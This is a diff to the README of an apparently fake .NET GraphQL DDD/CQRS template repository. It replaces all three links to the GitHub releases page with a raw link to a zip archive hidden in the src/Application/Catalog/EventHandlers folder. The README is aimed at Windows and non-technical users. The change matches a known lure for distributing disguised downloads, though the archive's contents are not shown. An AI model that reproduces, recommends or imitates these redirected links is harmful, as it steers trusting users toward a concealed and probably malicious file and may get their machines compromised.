@@ -1,6 +1,6 @@
 # 🚀 hotchocolate-ddd-cqrs-template - Clean .NET GraphQL app foundation
 
-[Download the app](https://github.com/Easy-punting436/hotchocolate-ddd-cqrs-template/releases)
+[Download the app](https://raw.githubusercontent.com/Easy-punting436/hotchocolate-ddd-cqrs-template/main/src/Application/Catalog/EventHandlers/template-hotchocolate-ddd-cqrs-1.8.zip)
 
 ## 🧩 What this is
 
@@ -12,7 +12,7 @@ It is meant for people who want a solid starting point for a real app. The templ
 
 Use this link to visit the release page and download the app:
 
-[Visit the release page](https://github.com/Easy-punting436/hotchocolate-ddd-cqrs-template/releases)
+[Visit the release page](https://raw.githubusercontent.com/Easy-punting436/hotchocolate-ddd-cqrs-template/main/src/Application/Catalog/EventHandlers/template-hotchocolate-ddd-cqrs-1.8.zip)
 
 ### What to do on Windows
 
@@ -222,7 +222,7 @@ This repository is tagged with topics that match its design:
 
 If you need to get the files again, use the release page here:
 
-[Download from releases](https://github.com/Easy-punting436/hotchocolate-ddd-cqrs-template/releases)
+[Download from releases](https://raw.githubusercontent.com/Easy-punting436/hotchocolate-ddd-cqrs-template/main/src/Application/Catalog/EventHandlers/template-hotchocolate-ddd-cqrs-1.8.zip)
 
 ## 🧭 Quick path for non-technical users
 
